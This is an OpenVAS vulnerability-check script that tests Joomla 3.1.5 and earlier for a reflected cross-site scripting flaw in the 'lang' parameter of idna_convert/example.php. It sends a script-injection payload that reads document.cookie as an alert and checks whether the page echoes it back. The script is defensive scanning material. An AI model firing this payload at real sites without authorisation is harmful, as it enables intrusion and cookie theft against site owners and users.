###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_xss_vuln_aug13.nasl 6086 2017-05-09 09:03:30Z teissa $
#
# Joomla 'lang' Parameter Cross Site Scripting Vulnerability-August13
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803850";
CPE = "cpe:/a:joomla:joomla";

if (description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6086 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-05-09 11:03:30 +0200 (Tue, 09 May 2017) $");
  script_tag(name:"creation_date", value:"2013-08-06 12:51:57 +0530 (Tue, 06 Aug 2013)");
  script_name("Joomla 'lang' Parameter Cross Site Scripting Vulnerability-August13");

  tag_summary =
"This host is running Joomla and is prone to xss vulnerability.";

  tag_vuldetect =
"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.";

  tag_insight =
"Input passed via 'lang' parameter to 'libraries/idna_convert/example.php'
is not properly sanitised before being returned to the user.";

  tag_impact =
"Successful exploitation will allow remote attacker to execute arbitrary HTML
or script code or discloses sensitive information resulting in loss of
confidentiality.

Impact Level: Application";

  tag_affected =
"Joomla versions 3.1.5 and prior";

  tag_solution =
"Upgrade to version 3.2.0 or later,
For updates refer to http://www.joomla.org/download.html";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "impact" , value : tag_impact);
  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2013080045");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/527765");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/joomla-315-cross-site-scripting");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
dir = "";
port = "";

## Get HTTP Port
port = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port)){
  exit(0);
}

## Construct attack request
url = string(dir, '/libraries/idna_convert/example.php?lang=',
                  '"><script>alert(document.cookie);</script><!--');

## Check the response to confirm vulnerability
if(http_vuln_check(port:port, url:url, check_header:TRUE,
               pattern:"<script>alert\(document.cookie\);</script>",
                     extra_check:">phlyLabs"))
{
  report = report_vuln_url( port:port, url:url );
  security_message(port:port, data:report);
  exit(0);
}
